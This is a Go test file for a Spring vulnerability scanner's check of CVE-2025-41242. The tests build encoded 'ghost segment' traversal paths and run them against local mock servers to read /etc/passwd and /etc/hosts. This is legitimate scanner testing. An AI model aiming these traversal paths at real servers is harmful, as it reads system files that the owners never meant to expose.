package vulns

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

func TestGhostPath(t *testing.T) {
	p, err := ghostPath("/etc/passwd")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(p, "阮严灵丰丰甲来/") {
		t.Fatalf("missing ghost segment: %q", p)
	}
	if !strings.HasSuffix(p, "passw%64") {
		t.Fatalf("last byte not encoded: %q", p)
	}
	if strings.Count(p, "阮严灵丰丰甲来/") != 7 {
		t.Fatalf("expected 7 ghost segments: %q", p)
	}
	if _, err := ghostPath(""); err == nil {
		t.Fatal("expected error for empty path")
	}
}

func TestCVE202541242Detect(t *testing.T) {
	newTarget := func(vulnerable bool) model.Target {
		mux := http.NewServeMux()
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			// 原始 UTF-8 幽灵段 + 末字节编码的目标文件
			if strings.Contains(r.URL.Path, "阮严灵丰丰甲来") && strings.HasSuffix(r.URL.Path, "passwd") {
				if vulnerable {
					_, _ = w.Write([]byte("root:x:0:0:root:/root:/bin/bash\n"))
					return
				}
			}
			http.NotFound(w, r)
		})
		ts := httptest.NewServer(mux)
		t.Cleanup(ts.Close)
		return model.Target{URL: ts.URL + "/", Client: client.New("", time.Second)}
	}

	verdict, err := (&cve202541242{}).Detect(context.Background(), newTarget(true))
	if err != nil {
		t.Fatal(err)
	}
	if !verdict.Vulnerable {
		t.Fatalf("expected vulnerable, got %+v", verdict)
	}

	verdict, err = (&cve202541242{}).Detect(context.Background(), newTarget(false))
	if err != nil {
		t.Fatal(err)
	}
	if verdict.Vulnerable {
		t.Fatalf("expected clean target, got %+v", verdict)
	}
}

func TestCVE202541242Exploit(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "hosts") && strings.Contains(r.URL.Path, "阮严灵丰丰甲来") {
			_, _ = w.Write([]byte("127.0.0.1 localhost\n"))
			return
		}
		http.NotFound(w, r)
	})
	ts := httptest.NewServer(mux)
	defer ts.Close()

	tgt := model.Target{URL: ts.URL + "/", Client: client.New("", time.Second)}
	out, _, err := (&cve202541242{}).Exploit(context.Background(), tgt, "/etc/hosts")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "localhost") {
		t.Fatalf("expected file content, got %q", out)
	}
}
